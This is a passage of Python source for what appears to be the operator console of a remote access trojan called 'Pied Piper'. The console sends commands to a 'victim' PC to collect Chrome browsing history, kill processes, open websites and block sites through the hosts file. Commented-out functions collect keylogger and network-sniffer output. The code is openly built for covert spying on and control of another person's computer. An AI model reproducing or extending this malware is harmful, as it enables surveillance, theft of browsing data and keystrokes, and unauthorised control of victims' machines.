        file_in_bytes = self.recv_large_data()
        with open(file_path + file_name + '.txt', 'wb') as f:
            f.write(file_in_bytes)

        os.startfile(file_path + file_name + '.txt')

    def import_chrome_history(self):
        """
        sends a request to view chrome browser surf history and save them in txt file
        :return:
        """
        if not self.has_chrome:
            messagebox.showinfo(title='Could not find chrome',
                                message='It seems like the victim has no chrome installed in his PC')
            return

        self.choose_location_and_request(('chrome_history_log',self.request_chrome_history))

    # def transfer_file(self):
    #     file_path = filedialog.askopenfilename()
    #     print("File path is: ", file_path)
    #     if file_path is not None and file_path != '':
    #         self.send("$TransferFile".encode())
    #         self.recv(1024)  # confirmation
    #         print('sending:', file_path.split('/')[-1])
    #         self.send(file_path.split('/')[-1].encode())
    #         file_in_bytes = b''
    #         with open(file_path, 'rb')as file:
    #             file_in_bytes = file.read()
    #
    #         self.send(str(len(self.symmetric_encryption.encrypt(file_in_bytes))).encode())
    #         self.recv(1024)
    #         print("recieved confirmation")
    #         try:
    #             self.my_socket.send(self.symmetric_encryption.encrypt(file_in_bytes))
    #         except Exception as e:
    #             self.sockets_error(str(e))

    def kill_process_by_name(self):
        """
        send a task of killing a process
        :return:
        """
        messagebox.showinfo(title="For You To Know",
                            message="You can get the list of active processes in the Data Gathering tab.")
        proc_name = simpledialog.askstring(title="Choose Process Name",
                                           prompt="Enter Process name + Extension\nFor example, notepad.exe : ",
                                           parent=self.root)
        if proc_name is not None:
            self.send('$KillProcByName'.encode())
            self.recv(1024)  # confirmation
            self.send(proc_name.encode())
            status = self.recv(1024).decode()
            messagebox.showinfo(title='Killing Status', message=status)

    def disconnect_from_rat(self):
        """
        closing the 2 peers connection and announce on it to the main server
        :return:
        """
        try:
            self.my_socket.send(b'disconnect rat')
        except Exception as e:
            self.sockets_error(str(e))
        print("disconnected")
        self.notebook.grid_forget()
        self.hide_btns()

        self.connection_ui(self.gilfoyleImageLabel_disconnect)

        self.grid_combobox()
        self.root.title("Pied Piper")
        self.update_available_rats_thread = StoppableThread(target=self.update_available_rats)
        self.update_available_rats_thread.start()
        self.connect_to_rat_thread = StoppableThread(target=self.connect_to_rat)
        # self.connect_to_rat_thread.start()

    # def append_key_to_file(self, file_name, string):
    #     print("writing: ", string, " to the file: ", file_name)
    #     """
    #     write a list of keys to a text file
    #     :param keys: list of keys pressed
    #     :return:
    #     """
    #     try:
    #         with open(file_name, 'a+') as f:
    #             f.write(string + "\n")
    #     except:
    #         print("writing to file failed")

    def open_website(self):
        """
        sends a command to victim to open a website
        """
        answer = simpledialog.askstring(title="Choose Website Address",
                                        prompt="Enter The url you want to open on the spied PC",
                                        parent=self.root)
        if answer is not None:
            self.send("$OpenWebsite".encode())
            print(self.recv(1024).decode())  # confirmation
            self.send(answer.encode())

    def block_site(self):
        """
        sends a command toi the victim to change the hosts file in order to block access to a url
        """
        if not self.is_admin:
            messagebox.showinfo(title='No Permission',
                                message='It seems like the victim user has no permission to edit hosts file')
            return

        answer = simpledialog.askstring(title="Choose Domain Address",
                                        prompt="Enter The domain you want to block on the spied PC",
                                        parent=self.root)
        if answer is not None:
            self.send("$blockSite".encode())
            print(self.recv(1024).decode())  # confirmation
            self.send(answer.encode())

    def release_blocked_site(self):
        """
        sends a command toi the victim to change the hosts file in order to release a blocked url
        """
        if not self.is_admin:
            messagebox.showinfo(title='No Permission',
                                message='It seems like the victim user has no permission to edit hosts file')
            return
        answer = simpledialog.askstring(title="Choose Domain Address",
                                        prompt="Enter The domain you want to release its block on the spied PC",
                                        parent=self.root)
        if answer is not None:
            self.send("$releaseBlockedSite".encode())
            print(self.recv(1024).decode())  # confirmation
            self.send(answer.encode())

    def release_all_blocked_site(self):
        """
        sends a command toi the victim to change the hosts file in order to release all blocked urls
        """
        if not self.is_admin:
            messagebox.showinfo(title='No Permission',
                                message='It seems like the victim user has no permission to edit hosts file')
            return

        self.send("$releaseAllBlockedSites".encode())
        print(self.recv(1024).decode())  # confirmation
        messagebox.showinfo(title='Release Blocked Sites',
                            message='Got a confirmation for releasing all blocked sites.')


    # def append_domain_to_file(self, file_name, domain):
    #     """
    #     write a list of keys to a text file
    #     :param keys: list of keys pressed
    #     :return:
    #     """
    #     try:
    #         print("writing: ", domain, " to the file: ", file_name)
    #         with open(file_name, 'r+') as f:
    #             if not (domain in f.read()):
    #                 f.write(domain + "\n")
    #     except:
    #         print("writing to file failed")

    # def keylog(self):
    #     try:
    #         log_client = Client(self.server_ip, self.port)
    #         log_client.init_client()
    #         # got_server_id = log_client.recv(1024).decode()  # server id
    #         task = "KeyLogger"
    #         log_client.send(task.encode())
    #         print(log_client.recv(1024).decode())  # received listening
    #         log_client.send("acknowledge key log".encode())
    #
    #         while True:
    #             if self.keylogging_thread.stopped():
    #                 return
    #             key = log_client.recv(1024).decode()
    #             self.append_key_to_file("log.txt", key)
    #             log_client.send("Got It".encode())
    #     except:
    #         print("key logging failed.")

    # def sniff_network(self):
    #     try:
    #         sniff_client = Client(self.server_ip, self.port)
    #         sniff_client.init_client()
    #         # got_server_id = sniff_client.recv(1024).decode()  # server id
    #         print("initiated sniff client")
    #         task = "NetworkSniffer"
    #         sniff_client.send(task.encode())
    #         print(sniff_client.recv(1024).decode())  # received listening
    #         sniff_client.send("acknowledge sniffer".encode())
    #
    #         while True:
    #             print("sniffing")
    #             domain = sniff_client.recv(1024).decode()
    #             print(domain)
    #             self.append_domain_to_file("network_activity.txt", domain)
    #             sniff_client.send("Got Sniffed Activity".encode())
    #     except:
    #         print("key logging failed.")


def main():
    PiperClient("127.0.0.1", 8200)


if __name__ == "__main__":
    main()
